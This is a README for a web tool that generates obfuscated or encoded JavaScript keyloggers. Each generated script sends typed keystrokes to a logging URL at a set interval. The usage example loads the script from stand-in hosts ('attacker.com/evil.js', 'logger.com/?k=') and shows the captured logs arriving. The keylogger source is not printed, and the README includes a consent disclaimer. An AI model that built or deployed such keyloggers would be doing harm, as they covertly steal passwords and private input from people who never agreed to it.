# js-keylogger-generator

"js-keylogger-generator" is a web application that generates a customizable keylogger script based on user inputs. Users can specify the URL where the captured keystrokes will be sent, as well as the time interval for sending the data. The generated script supports most keyboard characters and also includes special keys such as Backspace, Tab, Enter, Shift, Ctrl, Alt, Esc, Delete, and Caps Lock.

The tool currently supports US QWERTY keyboard layout, but it can be easily extended to support other keyboard layouts by modifying the source code. The generated script can also be obfuscated and encoded in various formats.

- None
- Obfuscated
- Base64 Encoded
- Base64 Encoded + Obfuscated
- Decimal Encoded
- Decimal Encoded + Obfuscated

# Legal Disclaimer
Please use this tool only for legal and ethical purposes, and with the explicit and informed consent of the users whose keystrokes you are logging. By using this tool, you assume all legal and ethical responsibilities for your actions, and agree to use it in compliance with all applicable laws, regulations, and ethical standards. You acknowledge that any unauthorized use of this tool is strictly prohibited, and that you are solely responsible for any consequences that may arise from such use.

# Usage
## Part 1

1. Go to: https://selmankon.github.io/js-keylogger-generator/
2. Fill in the necessary information in the form, including the URL ```Example: https://logger.com/?k=``` for the keylogger script and the interval timeout (in milliseconds).
3. Choose whether to encode or obfuscate the generated keylogger script, and select the appropriate options.
4. Click the "Generate" button to create the keylogger script.
5. Copy the generated script and paste it into a new JavaScript file in your logger website. ```(Example: https://attacker.com/evil.js)```

## Part 2
1. Add the keylogger script to your web page. 

Example: attacker.com includes ```<script src="https://attacker.com/evil.js">```

2. Launch the web page ```(in this case is attacker.com)``` and start typing. The keylogger will begin logging your keystrokes and sending them to the specified URL ```(in this case is logger.com)``` at the specified interval.

You can easily use:

```
python3 -m http.server 9090
```

## Example
1. Create and copy the keylogging script. Paste this into the script.js file on your attacker website.

<p align="center">
  <img src="https://user-images.githubusercontent.com/12685802/219286486-a748efbf-be03-4b8c-8a47-79a0a7e664ff.png" />
</p>

2. Go to the website that added the keylogger script. Send some keystrokes. (script.js is the generated script)

<p align="center">
  <img src="https://user-images.githubusercontent.com/12685802/219287011-6da64e39-89a4-459c-91f6-157c5e8e5fb9.png" />
</p>

3. Logs started to appear on the logger server at the "Source URL" you filled in the form.

<p align="center">
  <img src="https://user-images.githubusercontent.com/12685802/219287598-47bcc6da-c3f6-40e9-9553-b450c3590a9c.png" />
</p>
